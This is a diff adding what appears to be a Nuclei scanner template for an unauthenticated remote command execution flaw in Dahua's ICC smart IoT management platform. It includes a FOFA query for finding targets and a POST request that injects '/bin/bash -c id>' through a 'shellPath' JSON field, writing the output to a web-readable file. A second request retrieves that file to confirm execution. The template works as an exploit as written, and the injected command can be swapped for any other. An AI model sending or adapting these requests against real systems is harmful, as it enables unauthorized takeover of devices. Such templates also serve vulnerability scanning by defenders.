@@ -1,0 +1,46 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code == 200 && contains_all (body,"uid=","gid=")
+          name: 远程命令执行
+          type: dsl
+      raw:
+        - |
+          POST /evo-runs/v1.0/receive HTTP/1.1
+          Host: {{Hostname}}
+          user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+          Accept-Encoding: gzip
+          Content-Type: application/json
+          X-Subject-Headerflag: ADAPT
+          Content-Length: 243
+
+          {
+            "method": "agent.ossm.mapping.config",
+            "info": {
+              "configure": "abcd",
+              "filePath": "haha",
+              "paramMap": {
+                "shellPath": "/bin/bash -c id>/opt/evoWpms/static/{{username}}.txt",
+                "filePath": "abc"
+              },
+              "requestIp": ""
+            }
+          }
+        - |
+          GET /static/{{username}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+id: Dahua-ICC-ZNWLGLPT-receive-rce
+info:
+    author: HuanXiong
+    description: |-
+        fofa: body="*客户端会小于800*"
+        大华智能物联综合管理平台 receive 接口存在远程代码执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，获取系统权限。
+    name: 大华ICC智能物联管理平台 receive 远程命令执行
+    severity: critical
+    tags:
+        - Dahua-ICC
+        - dahua
+        - 大华智能物联综合管理平台
+variables:
+    username: '{{to_lower(rand_base(6))}}'
